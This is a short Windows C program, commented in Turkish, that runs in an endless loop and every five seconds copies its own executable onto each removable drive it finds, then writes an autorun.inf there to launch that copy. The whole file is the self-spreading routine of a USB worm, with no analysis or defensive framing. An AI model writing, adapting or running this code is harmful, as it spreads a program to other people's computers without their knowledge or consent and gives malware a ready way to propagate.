#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

// Bağlı sürücüleri kontrol eder ve dosyayı kopyalar
void checkForUSB() {
    char drive = 'A';
    char path[4];
    DWORD driveMask = GetLogicalDrives();
    char currentPath[MAX_PATH];
    char destPath[MAX_PATH];
    char autorunPath[MAX_PATH];

    // Programın çalıştığı yolu al
    GetModuleFileName(NULL, currentPath, MAX_PATH);

    while (drive <= 'Z') {
        if (driveMask & 1) {
            sprintf(path, "%c:\\", drive);

            // Eğer bu bir çıkarılabilir diskse
            if (GetDriveType(path) == DRIVE_REMOVABLE) {
                // Programı USB'ye kopyala
                sprintf(destPath, "%c:\\my_program.exe", drive);
                CopyFile(currentPath, destPath, FALSE);

                // autorun.inf dosyasını oluştur
                sprintf(autorunPath, "%c:\\autorun.inf", drive);
                FILE *autorunFile = fopen(autorunPath, "w");
                if (autorunFile != NULL) {
                    fprintf(autorunFile, "[Autorun]\n");
                    fprintf(autorunFile, "Open=my_program.exe\n");
                    fprintf(autorunFile, "Action=Run my program\n");
                    fprintf(autorunFile, "Label=My USB Program\n");
                    fprintf(autorunFile, "Icon=my_program.exe\n");
                    fclose(autorunFile);
                }
            }
        }
        drive++;
        driveMask >>= 1;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    while (1) {
        checkForUSB();
        Sleep(5000);  // 5 saniye bekle ve tekrar kontrol et
    }
    return 0;
}
